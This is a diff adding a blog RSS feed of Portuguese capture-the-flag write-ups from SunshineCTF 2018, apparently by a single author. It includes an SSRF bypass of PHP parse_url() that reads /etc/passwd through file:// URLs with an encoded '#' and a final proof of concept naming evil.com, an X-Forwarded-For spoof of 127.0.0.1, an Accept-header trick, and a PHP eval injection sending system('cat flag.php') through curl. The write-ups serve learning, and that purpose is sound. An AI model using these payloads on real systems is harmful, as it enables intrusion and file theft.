+  string&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;br&gt;
+Neste output acima, estamos passando o 127.0.0.1 como user, porem, o curl nao vai encontrar um user de autenticação igual a &lt;code&gt;127.0.0.1&lt;/code&gt;, a url será interpretada corretamente:
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/Q3N9nUN.png&quot;&gt;
+&lt;br&gt;
+Podemos tirar nossas conclusões que, se ele retornou &quot;Source Code&quot;, ou estamos em &lt;code&gt;127.0.0.1&lt;/code&gt; e o nosso bypass funcionou, ou estamos em &lt;code&gt;www.google.com&lt;/code&gt;.
+Para saber isso, podemos tentar pegar algum arquivo interno, como o index.php que existe no webroot.
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/mPBmx5f.png&quot;&gt;
+&lt;br&gt;
+Eee... não funcionou. 
+&lt;br&gt;
+&lt;br&gt;
+Fazendo algumas rápidas pesquisas e alguns testes, identifiquei um outro bypass, onde passamos um &lt;code&gt;user@127.0.0.1&lt;/code&gt; como usuário mais uma porta de destino,www.google.com continua sendo o host, porem a interpretação do curl acaba desvalorizando isso. Então, o &lt;code&gt;parse_url()&lt;/code&gt; praticamente não tem uma serventia de segurança neste código:
+&lt;br&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;php &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://user@127.0.0.1:80@www.google.com/index.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+php &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; var_dump&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;parse_url&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+array&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;scheme&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&amp;gt;&lt;/span&gt;
+  string&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http&quot;&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;host&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&amp;gt;&lt;/span&gt;
+  string&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;14&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;www.google.com&quot;&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;user&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&amp;gt;&lt;/span&gt;
+  string&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;14&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;user@127.0.0.1&quot;&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;pass&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&amp;gt;&lt;/span&gt;
+  string&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;80&quot;&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;path&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&amp;gt;&lt;/span&gt;
+  string&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/index.php&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;br&gt;
+Fiz também um teste local, com um código em /var/www/html/x.php
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://user@127.0.0.1:80@www.google.com/x.php&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   Trying 127.0.0.1...
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connected to 127.0.0.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;127.0.0.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Server auth using Basic with user &lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; GET /x.php HTTP/1.1
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Host: 127.0.0.1
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Authorization: Basic &lt;span class=&quot;nv&quot;&gt;dXNlcjo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; User-Agent: curl/7.47.0
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
+&amp;lt; HTTP/1.1 200 OK
+&amp;lt; Date: Sat, 07 Apr 2018 00:47:05 GMT
+&amp;lt; Server: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&amp;lt; Content-Length: 11
+&amp;lt; Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UTF-8
+&amp;lt; 
+TEST SSRF
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connection &lt;span class=&quot;c&quot;&gt;#0 to host 127.0.0.1 left intact&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;br&gt;
+&lt;br&gt;
+então fui para a aplicação:
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/PZmUHgj.png&quot;&gt;
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/nYUEobv.png&quot;&gt;
+&lt;br&gt;
+Porém a challenge nos dizia que era necessário pegar a flag em &lt;code&gt;/etc/flag.txt&lt;/code&gt;, mas não havia como eu usar o &lt;code&gt;file://&lt;/code&gt; pois nenhum arquivo estava sendo lido, me pareceu estranho isso.
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/xJWLbbN.png&quot;&gt;
+&lt;br&gt;
+&lt;br&gt;
+notei que ao final de cada arquivo passado, estava sendo concatenada à request uma &lt;code&gt;/&lt;/code&gt;, resolvi testar isso direto pelo curl e comparar os resultados:
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;file://user@127.0.0.1:80@www.google.com/etc/passwd&quot;&lt;/span&gt;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;br&gt;
+VS:
+&lt;br&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;file://user@127.0.0.1:80@www.google.com/etc/passwd/&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Couldn&lt;span class=&quot;s1&quot;&gt;&apos;t open file /etc/passwd/
+* Closing connection -1
+curl: (37) Couldn&apos;&lt;/span&gt;t open file /etc/passwd/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;br&gt;
+&lt;br&gt;
+Pensei em colocar uma &quot;#&quot; para travar isso, o curl aceitou:
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;file://user@127.0.0.1:80@www.google.com/etc/passwd#/&quot;&lt;/span&gt;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;br&gt;
+Mas a aplicação(usando o burp), não aceitou:
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/sn6lkYR.png&quot;&gt;
+&lt;br&gt;
+Então fiz o simples, o encode de &lt;code&gt;#&lt;/code&gt; para ser igual a &lt;code&gt;%23&lt;/code&gt;, e funcionou!
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/W6BsOji.png&quot;&gt;
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/BvHy36g.png&quot;&gt;
+&lt;br&gt;
+&lt;code&gt;Flag: sun{R3quE5t_tyP3S_m4tT3r}&lt;/code&gt;
+&lt;br&gt;
+
+&lt;code&gt;final PoC: file://user@evil.com:80@www.google.com//var/www/html/index.php%23&lt;/code&gt;
+
+
+
+</description>
+        <pubDate>Sun, 08 Apr 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/sunshine-search-box/</link>
+        <guid isPermaLink="true">http://localhost:4000/sunshine-search-box/</guid>
+        
+        
+        <category>writeups</category>
+     
+        
+      </item>
+    
+      <item>
+        <title>SunshineCtf - Marceau Writeup</title>
+        <description>&lt;code&gt;
+&quot;Marceau
+&lt;br&gt;
+Hey my friend tells me that the flag is in this site&apos;s source code. Idk how to read that though, lol (🅱️retty lame tbh 😂)
+&lt;br&gt;
+http://marceau.web1.sunshinectf.org
+&lt;br&gt;
+Author: charlton
+&lt;br&gt;
+Hint 2018-04-06 00:20 UTC: There are many different types of MIMEs, but only a handful were truly legendary...&quot;
+&lt;/code&gt;
+&lt;br&gt;
+A página que nós é dada, apenas nos diz que estamos supostamente não aceitando algo...
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/UodifCk.jpg&quot;&gt;
+&lt;br&gt;
+Pela lógica, ele está se referindo ao campo &lt;code&gt;Accept&lt;/code&gt; do header &lt;code&gt;HTTP&lt;/code&gt;.
+&lt;br&gt;
+Eu fiz uma pequena lista com alguns mimetypes referentes ao &lt;code&gt;PHP&lt;/code&gt;, e tentei coloca-los no &lt;code&gt;Accept&lt;/code&gt;
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/Bl7c9bp.jpg&quot;&gt;
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/10nlz54.jpg&quot;&gt;
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/hQgWazx.jpg&quot;&gt;
+&lt;br&gt;
+Até que funcionou :).
+&lt;br&gt;
+O campo &lt;code&gt;Accept&lt;/code&gt; ficou da seguinte forma:
+&lt;br&gt;
+&lt;code&gt;Accept: text/html,application/xhtml+xml,application/xml,application/x-php,text/php;q=0.9,*/*;q=0.8&lt;/code&gt;
+&lt;br&gt;
+&lt;code&gt;flag: sun{45k_4nd_y3_5h411_r3c31v3}&lt;/code&gt;
+</description>
+        <pubDate>Sun, 08 Apr 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/sunshine-marceau-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/sunshine-marceau-writeup/</guid>
+        
+        
+        <category>writeups</category>
+     
+        
+      </item>
+    
+      <item>
+        <title>SunshineCtf - Home Sweet Home</title>
+        <description>&lt;code&gt;&quot;Home Sweet Home
+&lt;br&gt;
+Looks like this site is doing some IP filtering.
+That&apos;s very FORWARD thinking of them.
+&lt;br&gt;
+Have fun!
+&lt;br&gt;
+http://web1.sunshinectf.org:50005&quot;&lt;/code&gt;
+&lt;br&gt;
+Essa challenge nos entregava a seguinte página:
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/0IGcZ3V.png&quot;&gt;
+&lt;br&gt;
+Pelo titulo e pelo ip sendo mostrado na página, logo imaginei que ele estava se referindo ao ip &lt;code&gt;127.0.0.1&lt;/code&gt;.
+Resolvi mandar o ip &lt;code&gt;127.0.0.1&lt;/code&gt; via o header &lt;code&gt;X-Forwarded-For&lt;/code&gt;...
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/az4Tp04.png&quot;&gt;
+
+E deu certo :).
+</description>
+        <pubDate>Sun, 08 Apr 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/sunshine-home-sweet-home/</link>
+        <guid isPermaLink="true">http://localhost:4000/sunshine-home-sweet-home/</guid>
+        
+        
+        <category>writeups</category>
+     
+        
+      </item>
+    
+      <item>
+        <title>SunshineCtf - Evaluation Writeup</title>
+        <description>&lt;code&gt;&quot;Evaluation
+&lt;br&gt;
+Evaluate your life.
+How are you doing, and are you doing the best you can possibly do?
+Look deeper within yourself, beyond the obvious.
+Look at the source of it all.
+&lt;br&gt;
+Also, here&apos;s a PHP challenge.&quot;&lt;/code&gt;
+&lt;br&gt;
+A challenge nós dava o seguinte código:
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/1gRJwXK.png&quot;&gt;
+&lt;br&gt;
+é notavel o &lt;code&gt;eval&lt;/code&gt; desprotegido. Para conseguir a shell, é muito simples, podemos simplesmente adicionar um &lt;code&gt;system()&lt;/code&gt; na request para ela ser incluida dentro do eval:
+&lt;br&gt;
+Para conseguir a shell, executei o seguinte comando para incluir o meu &lt;code&gt;system()&lt;/code&gt;:
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;hello=system(&quot;cat flag.php&quot;)&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://evaluation.web1.sunshinectf.org/&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;img src=&quot;https://i.imgur.com/hiniyjD.png&quot;&gt;
+&lt;br&gt;
+
+</description>
+        <pubDate>Sun, 08 Apr 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/sunshine-evaluation/</link>
+        <guid isPermaLink="true">http://localhost:4000/sunshine-evaluation/</guid>
+        
+        
+        <category>writeups</category>
+     
+        
+      </item>
+    
+  </channel>
+</rss>
